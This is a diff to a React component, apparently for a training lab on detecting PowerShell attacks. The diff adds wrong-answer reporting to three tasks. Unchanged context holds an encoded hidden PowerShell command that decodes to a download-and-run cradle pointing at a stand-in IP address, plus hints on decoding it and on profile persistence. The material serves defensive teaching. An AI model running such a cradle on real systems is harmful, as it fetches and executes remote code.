@@ -1,7 +1,7 @@
 "use client";
 
 import { useState } from "react";
-import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";
+import { TaskShell, MonoInput, SubmitBtn, reportWrong } from "./lab-ui";
 import { HintPanel } from "./hint-panel";
 
 const ENCODED_CMD = `powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAHAALgBwAHMAMQAnACkA`;
@@ -61,6 +61,7 @@ export function PowershellAttackDetectionClient({
       setT1Error("");
       void saveStage("task_1");
     } else {
+      reportWrong(labId, "task_1");
       setT1Error("Incorrect. Look at the flag immediately before the long string of letters and numbers.");
     }
   }
@@ -71,6 +72,7 @@ export function PowershellAttackDetectionClient({
       setT2Error("");
       void saveStage("task_2");
     } else {
+      reportWrong(labId, "task_2");
       setT2Error("Incorrect. -Enc payloads are Base64 of UTF-16LE text — decode it to find the URL being fetched.");
     }
   }
@@ -81,6 +83,7 @@ export function PowershellAttackDetectionClient({
       setT3Error("");
       void saveStage("task_3");
     } else {
+      reportWrong(labId, "task_3");
       setT3Error("Incorrect. This file runs automatically every time a new PowerShell session starts.");
     }
   }
